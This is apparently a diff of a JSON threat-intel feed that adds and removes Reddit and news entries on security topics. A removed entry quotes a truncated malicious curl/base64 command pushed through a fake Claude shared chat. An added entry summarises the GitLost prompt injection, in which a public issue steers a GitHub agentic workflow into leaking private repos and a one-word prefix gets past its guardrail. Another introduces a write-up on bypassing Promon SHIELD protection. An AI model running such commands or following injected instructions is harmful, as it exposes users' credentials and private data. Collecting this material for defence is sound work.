-      "summary": "How common is it for US/European companies to hire remote contract or part-time cybersecurity professionals? I was wondering how common it is for US or European companies to hire remote cybersecurity professionals on a part-time or contract basis, especially for roles like CTI, SOC, DFIR, or security engineering. Do most companies only hire people who are already local (or have work authorization in that country), or are there plenty of opportunities for someone working remotely from another country? I’d love to hear from anyone who’s done this or has experience hiring for these kinds of roles. submitted by /u/Impressive_Produce80 [link] [comments]",
-      "author": "/u/Impressive_Produce80",
-      "in_window": true,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_5_chatter",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      },
-      "score": 4
-    },
-    {
-      "source": "Reddit r/cybersecurity",
-      "cohort": "reddit_practitioner_osint",
-      "category": "reddit_practitioner_osint",
-      "title": "Microsoft is rewriting Windows patch guidance because of AI - Help Net Security",
-      "link": "https://www.reddit.com/r/cybersecurity/comments/1uu1l0i/microsoft_is_rewriting_windows_patch_guidance/",
-      "published": "2026-07-12T01:24:33+00:00",
-      "summary": "submitted by /u/Dash-Courageous [link] [comments]",
-      "author": "/u/Dash-Courageous",
-      "in_window": true,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_5_chatter",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      },
-      "score": 3
-    },
-    {
-      "source": "Reddit r/cybersecurity",
-      "cohort": "reddit_practitioner_osint",
-      "category": "reddit_practitioner_osint",
-      "title": "Ransomware negotiator hired to represent victims was working for the attackers",
-      "link": "https://www.reddit.com/r/cybersecurity/comments/1utwvzj/ransomware_negotiator_hired_to_represent_victims/",
-      "published": "2026-07-11T21:56:42+00:00",
-      "summary": "submitted by /u/DerBootsMann [link] [comments]",
-      "author": "/u/DerBootsMann",
-      "in_window": true,
-      "taxonomy": {
-        "threat_categories": [
-          "ransomware_extortion"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_5_chatter",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      },
-      "score": 3
-    },
-    {
-      "source": "Reddit r/cybersecurity",
-      "cohort": "reddit_practitioner_osint",
-      "category": "reddit_practitioner_osint",
-      "title": "Are AI coding agents becoming a new security risk inside engineering teams?",
-      "link": "https://www.reddit.com/r/cybersecurity/comments/1utvv2g/are_ai_coding_agents_becoming_a_new_security_risk/",
-      "published": "2026-07-11T21:12:23+00:00",
-      "summary": "I keep seeing people talk about AI coding agents as a productivity tool, but I think we are under-discussing the security side. A normal code assistant suggests code. An agent can do much more. It can read your repo, edit files, run commands, call tools, open PRs, access tickets, check logs, maybe even touch secrets or deployment workflows depending on how it is set up. That changes the risk. At that point, the question is not just “did the agent write good code?” It becomes: What did it access? What did it change? Why did it make that change? Did it introduce a vulnerability? Did it leak context somewhere? Can someone review the full trace later? What permissions should it never have? The scary part is that a lot of teams are moving fast with agents before they have clear rules around access, audit logs, testing, and ownership. This feels similar to early cloud/Kubernetes days. Everyone loved the speed, then later realized the hard part was visibility, limits, and knowing who owned wh",
-      "author": "/u/TruthIsAllYouNeed_",
-      "in_window": true,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_5_chatter",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      },
-      "score": 3
-    },
-    {
-      "source": "Reddit r/cybersecurity",
-      "cohort": "reddit_practitioner_osint",
-      "category": "reddit_practitioner_osint",
-      "title": "SOC Analyst with 4 years of experience in incident response and threat detection — AMA",
-      "link": "https://www.reddit.com/r/cybersecurity/comments/1utvbga/soc_analyst_with_4_years_of_experience_in/",
-      "published": "2026-07-11T20:49:55+00:00",
-      "summary": "Hey r/cybersecurity , I've been working as a SOC Analyst for about 4 years, currently at a mid-size fintech company. My day-to-day involves triaging alerts, threat hunting across our SIEM, and building/tuning detection rules in Splunk. Some background: Certifications: Security+, currently studying for OSCP I got into the field after starting out in IT helpdesk, then moved into a junior SOC role I've worked on a couple of real incident response cases, including a phishing-driven account compromise that turned into a broader investigation Happy to answer questions about breaking into the field, day-to-day SOC work, certifications worth pursuing, tools I actually use vs. what's overhyped, or general career advice. submitted by /u/Federico_Di_Domenico [link] [comments]",
-      "author": "/u/Federico_Di_Domenico",
-      "in_window": true,
-      "taxonomy": {
-        "threat_categories": [
-          "phishing_social_eng"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "financial_services"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_5_chatter",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      },
-      "score": 3
-    },
-    {
-      "source": "Reddit r/cybersecurity",
-      "cohort": "reddit_practitioner_osint",
-      "category": "reddit_practitioner_osint",
-      "title": "Starting a CrowdStrike Falcon engineer contract — looking to connect with experienced folks",
-      "link": "https://www.reddit.com/r/cybersecurity/comments/1uttvj8/starting_a_crowdstrike_falcon_engineer_contract/",
-      "published": "2026-07-11T19:52:25+00:00",
-      "summary": "Hey all — I just landed a CrowdStrike Engineer contract role (starts in a few days) and want to hit the ground running. I've got a solid security background but I'm looking to sharpen my hands-on Falcon skills before day one — things like EDR investigation workflows, FQL/Event Search, sensor policy management, and Real-time Response. If anyone here works with Falcon day-to-day and is open to answering a few questions or pointing me to good resources (labs, docs, communities), I'd really appreciate it. Happy to return the favor down the line. Thanks in advance! submitted by /u/Glad-Wrongdoer1513 [link] [comments]",
-      "author": "/u/Glad-Wrongdoer1513",
-      "in_window": true,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_5_chatter",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      },
-      "score": 3
-    },
-    {
-      "source": "Reddit r/cybersecurity",
-      "cohort": "reddit_practitioner_osint",
-      "category": "reddit_practitioner_osint",
-      "title": "Thoughts on Aikido.dev?",
-      "link": "https://www.reddit.com/r/cybersecurity/comments/1utspyr/thoughts_on_aikidodev/",
-      "published": "2026-07-11T19:06:14+00:00",
-      "summary": "Hey, We are currently Poc'ing with Aikido and everything looks so good so far. However I'd appreciate to hear some real world experience with the products they're offering. How was your experience so far? What are their strengths vs. their weaknesses? EDIT: Especially curious about their Autofix feature Thanks submitted by /u/PredictiveDefense [link] [comments]",
-      "author": "/u/PredictiveDefense",
-      "in_window": true,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "poc_available"
-        ],
-        "content_type": "news_report",
-        "confidence_tier": "tier_5_chatter",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      },
-      "score": 3
     },
     {
       "source": "The Hacker News",
@@ -1634,93 +1425,6 @@
       "score": 5
     },
     {
-      "source": "Reddit r/cybersecurity",
-      "cohort": "reddit_practitioner_osint",
-      "category": "reddit_practitioner_osint",
-      "title": "Microsoft admits Windows 11 has a GDID tracker with no off switch, first documented publicly in an FBI hacker complaint",
-      "link": "https://www.reddit.com/r/cybersecurity/comments/1utqhu4/microsoft_admits_windows_11_has_a_gdid_tracker/",
-      "published": "2026-07-11T17:40:59+00:00",
-      "summary": "submitted by /u/Dash-Courageous [link] [comments]",
-      "author": "/u/Dash-Courageous",
-      "in_window": true,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_5_chatter",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      },
-      "score": 3
-    },
-    {
-      "source": "Reddit r/cybersecurity",
-      "cohort": "reddit_practitioner_osint",
-      "category": "reddit_practitioner_osint",
-      "title": "BloodBash Feedback Needed Before DEF CON 34 Red Team Village Talk - AD/hybrid Recon Tool",
-      "link": "https://www.reddit.com/r/cybersecurity/comments/1utp80u/bloodbash_feedback_needed_before_def_con_34_red/",
-      "published": "2026-07-11T16:52:29+00:00",
-      "summary": "Hey everyone! I'm doing final prep for my Red Team Village session at DEF CON 34 on BloodBash, my lightweight CLI Python tool for Active Directory and hybrid Entra ID analysis. I'm reaching out to the community for some real-world feedback before I lock everything in. If you've tried BloodBash, I'd love to hear from you! Repo here: https://github.com/DotNetRussell/BloodBash A few things I'm especially interested in: - How easy was it to install and use for you? - What features or detections would make it even more useful in your workflow? - Any thoughts on enriching the output (better reporting, formatting, exports, etc.)? All feedback is welcome positive, constructive, ideas, pain points, whatever you've got. Really appreciate the help and looking forward to sharing the tool with everyone at DEF CON! Thanks! submitted by /u/DotNetRussell [link] [comments]",
-      "author": "/u/DotNetRussell",
-      "in_window": true,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_5_chatter",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      },
-      "score": 3
-    },
-    {
-      "source": "Reddit r/cybersecurity",
-      "cohort": "reddit_practitioner_osint",
-      "category": "reddit_practitioner_osint",
-      "title": "Destructive Windows backdoor stuffs multiple wipers and ransomware code into a single package",
-      "link": "https://www.reddit.com/r/cybersecurity/comments/1utmm42/destructive_windows_backdoor_stuffs_multiple/",
-      "published": "2026-07-11T15:09:49+00:00",
-      "summary": "submitted by /u/NISMO1968 [link] [comments]",
-      "author": "/u/NISMO1968",
-      "in_window": true,
-      "taxonomy": {
-        "threat_categories": [
-          "ransomware_extortion",
-          "web_shell_backdoor"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_5_chatter",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      },
-      "score": 3
-    },
-    {
       "source": "BleepingComputer",
       "cohort": "cyber_news_breach_reporting",
       "category": "cyber_news_breach_reporting",
@@ -1747,78 +1451,6 @@
         }
       },
       "score": 4
-    },
-    {
-      "source": "Reddit r/cybersecurity",
-      "cohort": "reddit_practitioner_osint",
-      "category": "reddit_practitioner_osint",
-      "title": "Google \"Sponsored\" ad for \"Claude mac app\" leads to a fake install guide hosted as a shared Claude chat and the terminal command installs malware",
-      "link": "https://www.reddit.com/r/cybersecurity/comments/1utl1xt/google_sponsored_ad_for_claude_mac_app_leads_to_a/",
-      "published": "2026-07-11T14:06:26+00:00",
-      "summary": "Searched \"Claude mac app\" on Google. Top sponsored result shows claude[.]ai as the domain. looks 100% legit. Clicking it opens a shared Claude conversation titled \"Claude Code on Mac\" (\"Shared by Technical Support\" ) with step-by-step instructions to open Terminal and run: curl -kfsSL $(echo 'aHR0cDovL...' | base64 -d)... That base64 decodes to an attacker's URL — it downloads and executes a script, almost certainly a macOS infostealer (AMOS-style: steals keychain passwords, browser data, wallets). The genius/evil part: the phishing page is hosted on real claude[.]ai , so both Google's ad review and victims' gut-check pass. Same trick works with ChatGPT shared chats. I couldn't attach screenshots. submitted by /u/hadibikey [link] [comments]",
-      "author": "/u/hadibikey",
-      "in_window": true,
-      "taxonomy": {
-        "threat_categories": [
-          "phishing_social_eng",
-          "credential_theft"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "Anthropic/Claude",
-          "Apple iOS/macOS"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_5_chatter",
-        "role_map": {
-          "Anthropic/Claude": "target",
-          "Apple iOS/macOS": "target",
-          "OpenAI/ChatGPT": "mention"
-        },
-        "weak_tags": {
-          "products": [
-            [
-              "OpenAI/ChatGPT",
-              "mention",
-              0.3
-            ]
-          ]
-        }
-      },
-      "score": 2
-    },
-    {
-      "source": "Reddit r/cybersecurity",
-      "cohort": "reddit_practitioner_osint",
-      "category": "reddit_practitioner_osint",
-      "title": "Security Policies - Logging Best practice",
-      "link": "https://www.reddit.com/r/cybersecurity/comments/1utib6r/security_policies_logging_best_practice/",
-      "published": "2026-07-11T12:04:14+00:00",
-      "summary": "Hi, We have to review our Palo alto firewalls logging strategy. Currently logs gets forwarded to the Managed SOC for 24x7 detection and monitoring. Ingestion and storage retention costs have gone up quite a bit. At the same time, we don’t want to switch off useful logging and regret it during an incident. Right now, we’re logging pretty much everything. We have segmentation between internal servers and plus IPsec tunnels connecting more than 30 sites. Logging is enabled on all the security policies on session end. On top of the traffic logs, we’re sending URL filtering, threat, system, and configuration logs Would appreciate any suggestions to reduce the log noise submitted by /u/Final-Pomelo1620 [link] [comments]",
-      "author": "/u/Final-Pomelo1620",
-      "in_window": true,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_5_chatter",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      },
-      "score": 2
     },
     {
       "source": "SANS Internet Storm Center",
@@ -1879,6 +1511,38 @@
         }
       },
       "score": 4
+    },
+    {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "Reversing Promon SHIELD: From Emulator Detection to an Xposed Data-Only Patch guidance",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1utdtej/reversing_promon_shield_from_emulator_detection/",
+      "published": "2026-07-11T07:53:04+00:00",
+      "summary": "> This is a write-up of an authorized reverse-engineering engagement against an Android app hardened with **Promon SHIELD** (RASP / app-shielding). App names, package names, endpoints, and account data are redacted. The focus is on the concrete procedure: how to walk a crash stack back to the native detection source, how to validate hypotheses with a bit-level experiment matrix, and how to turn a throwaway root patch into a stable LSPosed module that runs entirely in-process. 0. Fingerprinting the SDK Promon SHIELD has a very consistent runtime signature across samples. The features to match on first: - Obfuscated entry classes under the `yrdei.*` namespace, e.g. `yrdei.Q`, `yrdei.j`, `yrdei.F`, `yrdei.a`. - `Application.attachBaseContext` calls into `yrdei.a.attachBaseContext -> yrdei.Q.d -> yrdei.Q.c`, which bottoms out in a native method. - A native library (`libpostpe.so` in this build; the name varies across SHIELD versions) heavily obfuscated with OLLVM control-flow flattening an",
+      "author": "/u/AndriodRE_Expert",
+      "in_window": true,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Android"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {
+          "Android": "target"
+        },
+        "weak_tags": {
+          "products": []
+        }
+      },
+      "score": 2
     },
     {
       "source": "The Hacker News",
@@ -3388,6 +3052,34 @@
       "score": 7
     },
     {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "Why is validating security controls against real-world TTPs so hard??",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1usdxg9/why_is_validating_security_controls_against/",
+      "published": "2026-07-10T05:00:19+00:00",
+      "summary": "We have a reasonable set of controls and detections, but we rarely test them against the kinds of TTPs that show up in recent threat reporting. Most of our validation is still limited to basic functional checks or lessons learned during incidents. Every time a new campaign takes over the news cycle, someone asks whether our environment would catch similar behavior, and the honest answer is usually that we are not sure. If you have found a way to regularly validate controls against real world TTPs, how did you put it together? Did you rely on internal automation, commercial exposure validation platforms, a close partnership with a red team, or some combination? I am interested in approaches that remain usable over time instead of turning into a one off project. submitted by /u/Electronic_Treat2386 [link] [comments]",
+      "author": "/u/Electronic_Treat2386",
+      "in_window": true,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      },
+      "score": 2
+    },
+    {
       "source": "Help Net Security",
       "cohort": "cyber_news_breach_reporting",
       "category": "cyber_news_breach_reporting",
@@ -4083,6 +3775,37 @@
       "fetch_status": "ok"
     },
     {
+      "source": "Reddit r/netsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "Suspected Russian Threat Actor Impersonates Legitimate Crypto Wallets to Deploy Remote Utilities",
+      "link": "https://www.reddit.com/r/netsec/comments/1urrw3w/suspected_russian_threat_actor_impersonates/",
+      "published": "2026-07-09T14:28:00+00:00",
+      "summary": "submitted by /u/CyberMasterV [link] [comments]",
+      "author": "/u/CyberMasterV",
+      "in_window": true,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services",
+          "critical_infrastructure"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      },
+      "score": 2
+    },
+    {
       "source": "Huntress",
       "cohort": "detection_response_operations",
       "category": "detection_response_operations",
@@ -4422,6 +4145,39 @@
         }
       },
       "score": 6
+    },
+    {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "SOC in Pakistan feels very different from the stuff you read online",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1urjpfw/soc_in_pakistan_feels_very_different_from_the/",
+      "published": "2026-07-09T07:59:11+00:00",
+      "summary": "​ Most of the stuff I see online about SOC sounds like it’s written for some perfect Western bank with unlimited budget. 24/7 team, playbooks, fancy tools, all that. Ground reality here (Pakistan side) honestly doesn’t look like that. A lot of places want to say “we have a SOC” because it looks good for regulators and management, but behind the scenes you’ll usually find 2–3 people trying to keep up with alerts, half‑configured tools, and a mix of legacy systems that don’t want to talk to each other. You open the SIEM and there’s this wall of noise, and everyone pretends it’s “under control”. Day to day, the stuff that actually hurts isn’t some movie style APT. It’s stupid but painful things users falling for very basic phishing in local language, internal access misuse, weird gaps between core banking and the shiny mobile app, someone doing risky changes at odd hours and nobody really owning it. You don’t see that in the glossy SOC diagrams. You can feel this even in the kinds of SOCs",
+      "author": "/u/Xorphian",
+      "in_window": true,
+      "taxonomy": {
+        "threat_categories": [
+          "phishing_social_eng",
+          "apt_espionage"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      },
+      "score": 2
     },
     {
       "source": "Infosecurity Magazine",
@@ -4824,6 +4580,45 @@
         }
       },
       "score": 4
+    },
+    {
+      "source": "Reddit r/netsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "Drift Corpus: binary diffs of 240+ 2026 Windows kernel patches",
+      "link": "https://www.reddit.com/r/netsec/comments/1uqxlxq/drift_corpus_binary_diffs_of_240_2026_windows/",
+      "published": "2026-07-08T16:24:55+00:00",
+      "summary": "Patch Tuesday confirms a CVE is fixed but not what changed in the binary, which function, which check, or whether it's a real fix or just churn. The Drift Corpus is a diff of 240+ 2026 Windows kernel patches. Per entry: the changed functions with assembly, the bug class and call chain, WinDbg breakpoints to reproduce, and a plain-English root cause. Browse: https://byteray-ai.github.io/drift-corpus Repo: https://github.com/ByteRay-AI/drift-corpus This repository breaks down Microsoft’s monthly kernel patches into clear binary changes, giving researchers a practical roadmap to find adjacent bugs, build faster EDR detections, and write precise firewall and network rules to block exploits at the perimeter. submitted by /u/Emergency_Stable_923 [link] [comments]",
+      "author": "/u/Emergency_Stable_923",
+      "in_window": true,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Microsoft Windows"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {
+          "Microsoft Windows": "target",
+          "GitHub": "mention"
+        },
+        "weak_tags": {
+          "products": [
+            [
+              "GitHub",
+              "mention",
+              0.3
+            ]
+          ]
+        }
+      },
+      "score": 2
     },
     {
       "source": "The Hacker News",
@@ -5372,6 +5167,34 @@
       "score": 4
     },
     {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "How to optimize exposure validation across your entire security stack?",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1uqlaeg/how_to_optimize_exposure_validation_across_your/",
+      "published": "2026-07-08T07:09:31+00:00",
+      "summary": "We finally decided to run a full exposure validation across the stack instead of relying on isolated checks. That included endpoints, email security, WAF, identity, and our main cloud workloads. The goal was simple: verify whether controls and detections still behave the way we think they do when you walk a realistic attack path end to end, then use that insight to tighten how and where we run these tests so we are not wasting cycles. The surprise was not just that we had gaps, but where they were, and that forced us to rethink how we tune and schedule validation runs. Some issues showed up in paths that had passed previous reviews, and a few detection rules that looked fine during content review never triggered when we replayed real world sequences of initial access, privilege escalation, and lateral movement. In some places we had logging but no useful signal, in others we had signal but no rules tied to it. If you have optimized this process in your stack, how often do you run full ",
+      "author": "/u/Ok_Hedgehog_94",
+      "in_window": true,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      },
+      "score": 2
+    },
+    {
       "source": "The Hacker News",
       "cohort": "cyber_news_breach_reporting",
       "category": "cyber_news_breach_reporting",
@@ -5508,6 +5331,36 @@
       "score": 10,
       "full_body": "The Threat Isn’t the Frontier Model Quantization is the Clock Summer ‘26 vibes: international flights, Riyadh heat, and plentiful CISO conversations. Every conversation (regardless of geographic location or industry vertical) currently begins and ends with AI strategy. Let’s unpack the nuance. Every executive should be contemplating two questions at this moment : Are we building, testing, and scaling agents for the coming onslaught of AI-enabled adversary activity? Do we have the breadth of intelligence necessary to move at machine speed? Why Agents and Why Now? Timing is everything in life. So the question is: why invest in agents for defensive workflows now? Two premises need to be explained here. First, let’s focus on financially motivated adversaries that don’t receive a government paycheck (directly or indirectly). The state-sponsored adversaries have a different set of resources at their disposal. There are controlled cases where Frontier AI models enable autonomous adversarial activity in malware generation or holistic intrusion chains. Even the Five Eyes are officially warning about adversarial use of frontier models. Yet the onslaught of offensive agents hasn’t materialized yet. Like the Uruk-hai attacking Helm’s Deep in The Lord of the Rings , we expect the wave is coming, but the automated army hasn’t arrived. Why not? Frontier models may be susceptible to context poisoning over time, but it’s difficult to use them at any scale for automated offensive operations. The guardrails are sufficient for the moment. Adversaries are also caught between the OPSEC tension of using third-party APIs (which increases attribution risk) and investing the resources to build local open-source models. While much has been made of open-source model capabilities, the reality is that time, effort, and financial resources are required to use them effectively for offensive campaigns. To get nerdy for a second (because the details are important), a recent experiment with LibreChat and Dolphin-llama3:14b (uncensored LLM) on a $3K local server (containing a reasonable Nvidia GPU with 16GB of VRAM ) revealed that simple tasks like coding a new web shell are still out of reach. The level of effort and hardware required to build a local resource capable of orchestrating effective autonomous attack agents will only decrease over time. Quantization is the clock defenders should be watching. A reductive quantization explanation in this AI context is using less memory by rounding billions of numbers (weights) rather than maintaining precision, thereby shrinking an AI model’s size. Even though the model is slightly less capable, it’s still useful for most tasks. Quantization drives the hardware bar down, and the lower that bar falls, the sooner opportunistic actors can execute attacks at scale. The danger for defenders isn’t the headline-grabbing frontier models; it’s the ease with which adversaries can deploy effective local models on modest hardware. Based on the previous 18 months of advances , the next 6-12 months will likely yield similar advances in open-source model capabilities with minimal hardware investment. That’s when opportunistic actors start staging at scale. Which brings us back to protecting the proverbial house with defensive AI agents. Now is the time to build , not ponder. We don’t jump into self-driving cars until we have some confidence that the edge cases have been worked out. Similarly, the agentic workflow edge cases can’t be discovered and solved without iteration and testing. Smart CISOs are building an AI control plane (in collaboration with adjacent business units) to enable transparency into AI token consumption, project ROI visibility, and code security . Building and testing agents is part of a larger control-plane project and is particularly time-sensitive. Sandwiched between data availability and information security regulations, CISOs need to generate trust and confidence in agents. Humans may stay in the decision l",
       "fetch_status": "ok"
+    },
+    {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "How do you get employees to actually get better at spotting phishing emails?",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1uqbhv6/how_do_you_get_employees_to_actually_get_better/",
+      "published": "2026-07-07T23:18:12+00:00",
+      "summary": "We're reworking our employee training because the current approach isn't doing much beyond checking a compliance box. People finish the annual course, pass the quiz, and a few hours later it's like none of it ever happened. I'd rather move toward something that actually improves day to day habits. Things like phishing simulations, making it easier to report suspicious emails, shorter training throughout the year, or anything else that's worked well. For those who've found something that genuinely made a difference, what did you end up doing? Any platforms or approaches you'd recommend, or things that sounded good but fell flat once they were rolled out? submitted by /u/AliveSuburb [link] [comments]",
+      "author": "/u/AliveSuburb",
+      "in_window": true,
+      "taxonomy": {
+        "threat_categories": [
+          "phishing_social_eng"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      },
+      "score": 2
     },
     {
       "source": "CyberScoop",
@@ -5872,6 +5725,40 @@
       "fetch_status": "ok"
     },
     {
+      "source": "Reddit r/netsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "GitLost: a public GitHub issue can steer an org's Agentic Workflow into leaking private repo contents, and a one-word prefix (\"Additionally\") bypassed the threat-detection guardrail",
+      "link": "https://www.reddit.com/r/netsec/comments/1upy3gm/gitlost_a_public_github_issue_can_steer_an_orgs/",
+      "published": "2026-07-07T15:16:22+00:00",
+      "summary": "Noma Security published a technique they call GitLost against GitHub Agentic Workflows (the plain-English-Markdown agent feature GitHub put into public preview in February, runnable on Copilot, Claude, Gemini, or Codex). Worth reading because it is a clean demonstration of why \"filter the injection\" does not hold as a defense. The setup. Workflows are read-only by default, but an org can hand one a personal access token with read access across its repos, private ones included, to give the agent cross-repo context. That grant is the whole vulnerability. Nothing else about the attack requires access: no stolen creds, no write access to anything private, no touching a server. The attacker just opens a normal-looking issue on a public repo. The technique is indirect prompt injection, which is not new, but the interesting part is what the agent controls. Noma's Sasi Levi frames the distinction as earlier injection being about manipulating what an agent says, versus GitLost being about what ",
+      "author": "/u/Aureliand",
+      "in_window": true,
+      "taxonomy": {
+        "threat_categories": [
+          "ai_security"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "GitHub"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "incident_report",
+        "confidence_tier": "tier_5_chatter",
+        "role_map": {
+          "GitHub": "target"
+        },
+        "weak_tags": {
+          "products": []
+        }
+      },
+      "score": 6
+    },
+    {
       "source": "The Hacker News",
       "cohort": "cyber_news_breach_reporting",
       "category": "cyber_news_breach_reporting",
@@ -5904,6 +5791,34 @@
         }
       },
       "score": 4
+    },
+    {
+      "source": "Reddit r/AskNetsec",
+      "cohort": "reddit_practitioner_osint",
+      "category": "reddit_practitioner_osint",
+      "title": "Theoretical breakdown of vulnerabilities: how would you attack a site with this set of holes?",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1upxdvs/theoretical_breakdown_of_vulnerabilities_how/",
+      "published": "2026-07-07T14:51:29+00:00",
